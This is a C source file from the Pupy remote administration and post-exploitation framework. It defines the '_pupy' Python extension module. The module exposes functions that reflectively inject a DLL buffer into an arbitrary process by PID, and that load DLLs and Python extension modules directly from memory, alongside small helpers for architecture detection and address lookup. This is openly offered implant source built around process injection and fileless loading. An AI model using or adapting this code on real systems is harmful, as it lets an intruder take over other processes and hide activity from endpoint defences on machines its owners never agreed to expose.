/*
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
*/

#include <windows.h>
#include "Python-dynload.h"
#include "debug.h"
#include "MyLoadLibrary.h"
#include "base_inject.h"

static char module_doc[] = DOC("Builtins utilities for pupy");

#ifndef UINTPTR
 #ifndef _WIN32
   typedef DWORD UINTPTR;
 #else
   typedef ULONGLONG UINTPTR;
 #endif
#endif

static PyObject *ExecError;

#include "revision.h"

#ifdef _PUPY_DLL
#include "jni_on_load.c"
#endif

static PyObject *Py_on_exit_session_callback = NULL;

void * __JVM = NULL;

void on_exit_session(void) {
    PyGILState_STATE gstate;
        PyObject * pResult;

        if (!Py_on_exit_session_callback)
                return;

    gstate = PyGILState_Ensure();
    pResult = PyObject_CallObject(Py_on_exit_session_callback, NULL);
    PyGILState_Release(gstate);
}

static PyObject *Py_set_exit_session_callback(PyObject *self, PyObject *args)
{
        PyObject *old = Py_on_exit_session_callback;

        if (!PyArg_ParseTuple(args, "O", &Py_on_exit_session_callback))
                return NULL;

        Py_XINCREF(Py_on_exit_session_callback);
        Py_XDECREF(old);

        return PyBool_FromLong(1);
}

static PyObject *Py_get_arch(PyObject *self, PyObject *args)
{
#ifdef _WIN64
        return Py_BuildValue("s", "x64");
#else
        return Py_BuildValue("s", "x86");
#endif
}

static PyObject *Py_reflective_inject_dll(PyObject *self, PyObject *args)
{
        DWORD dwPid;
        const char *lpDllBuffer;
        DWORD dwDllLenght;
        const char *cpCommandLine;
        PyObject* py_is64bit;
        int is64bits;
        if (!PyArg_ParseTuple(args, "Is#O", &dwPid, &lpDllBuffer, &dwDllLenght, &py_is64bit))
                return NULL;
        is64bits = PyObject_IsTrue(py_is64bit);
        if(is64bits){
                is64bits=PROCESS_ARCH_X64;
        }else{
                is64bits=PROCESS_ARCH_X86;
        }
        if(inject_dll( dwPid, lpDllBuffer, dwDllLenght, NULL, is64bits) != ERROR_SUCCESS)
                return NULL;
        return PyBool_FromLong(1);
}

static PyObject *Py_load_dll(PyObject *self, PyObject *args)
{
        DWORD dwPid;
        const char *lpDllBuffer;
        DWORD dwDllLenght;

        const char *dllname;
        if (!PyArg_ParseTuple(args, "ss#", &dllname, &lpDllBuffer, &dwDllLenght))
                return NULL;

        return PyLong_FromVoidPtr(MyLoadLibrary(dllname, lpDllBuffer, NULL));
}

static PyObject *Py_find_function_address(PyObject *self, PyObject *args)
{
        const char *lpDllName = NULL;
        const char *lpFuncName = NULL;
        void *address = NULL;

        if (PyArg_ParseTuple(args, "ss", &lpDllName, &lpFuncName)) {
                address = MyFindProcAddress(lpDllName, lpFuncName);
        }

        return PyLong_FromVoidPtr(address);
}

static PyObject *Py_is_shared_object(PyObject *self, PyObject *args)
{
#ifdef _PUPY_DLL
        return PyBool_FromLong(1);
#else
        return PyBool_FromLong(0);
#endif
}

static PyObject *
import_module(PyObject *self, PyObject *args)
{
        char *data;
        int size;
        char *initfuncname;
        char *modname;
        char *pathname;
        //HMEMORYMODULE hmem;
        HMODULE hmem;
        FARPROC do_init;

        ULONG_PTR cookie = 0;
        char *oldcontext;

        /* code, initfuncname, fqmodulename, path */
        if (!PyArg_ParseTuple(args, "s#sss:import_module",
                              &data, &size,
                              &initfuncname, &modname, &pathname))
                return NULL;

        dprint(
                "import_module(name=%s size=%d ptr=%p)\n",
                pathname, size, data);

        //try some windows manifest magic...
        cookie = _My_ActivateActCtx();
        hmem = MyLoadLibrary(pathname, data, NULL);
        _My_DeactivateActCtx(cookie);

        if (!hmem) {
                PyErr_Format(PyExc_ImportError,
                             "MemoryLoadLibrary failed loading %s (err=%d)",
                                 pathname, GetLastError());
                return NULL;
        }

        do_init = MyGetProcAddress(hmem, initfuncname);
        if (!do_init) {
                MyFreeLibrary(hmem);
                PyErr_Format(PyExc_ImportError,
                             "Could not find function %s", initfuncname);
                return NULL;
        }

    oldcontext = _Py_PackageContext;

        _Py_PackageContext = modname;
        do_init();
        _Py_PackageContext = oldcontext;

        if (PyErr_Occurred())
                return NULL;

        /* Retrieve from sys.modules */
        return PyImport_ImportModule(modname);
}

static PyMethodDef methods[] = {
        { "is_shared", Py_is_shared_object, METH_NOARGS, DOC("Client is shared object") },
        { "get_arch", Py_get_arch, METH_NOARGS, DOC("get current pupy architecture (x86 or x64)") },
        { "reflective_inject_dll", Py_reflective_inject_dll, METH_VARARGS|METH_KEYWORDS, DOC("reflective_inject_dll(pid, dll_buffer, isRemoteProcess64bits)\nreflectively inject a dll into a process. raise an Exception on failure") },
        { "import_module", import_module, METH_VARARGS,
          "import_module(data, size, initfuncname, path) -> module" },
        { "load_dll", Py_load_dll, METH_VARARGS, DOC("load_dll(dllname, raw_dll) -> ptr") },
        { "set_exit_session_callback", Py_set_exit_session_callback, METH_VARARGS, DOC("set_exit_session_callback(function)")},
        { "find_function_address", Py_find_function_address, METH_VARARGS,
          DOC("find_function_address(dllname, function) -> address") },
        { NULL, NULL },         /* Sentinel */
};

DL_EXPORT(void)
init_pupy(void)
{
        PyObject *pupy = Py_InitModule3("_pupy", methods, module_doc);
        if (!pupy) {
                return;
        }

        PyModule_AddStringConstant(pupy, "revision", GIT_REVISION_HEAD);
        ExecError = PyErr_NewException("_pupy.error", NULL, NULL);
        Py_INCREF(ExecError);
        PyModule_AddObject(pupy, "error", ExecError);

#ifdef _PUPY_DLL
        setup_jvm_class();
#endif
}
